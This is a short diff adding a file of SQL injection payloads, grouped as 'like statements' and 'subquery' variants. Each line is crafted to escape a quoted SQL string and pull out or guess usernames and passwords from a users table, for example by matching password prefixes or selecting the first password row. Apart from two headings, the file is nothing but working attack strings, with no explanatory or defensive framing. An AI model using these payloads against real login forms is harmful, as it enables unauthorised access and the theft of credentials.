@@ -1,0 +1,7 @@
+Like statements:
+' or username like 'a%
+' or password like 'k%
+
+Using a subquery:
+' or username = (select username from users limit 1) or username like '
+' or password = (select password from users limit 1) or password like '
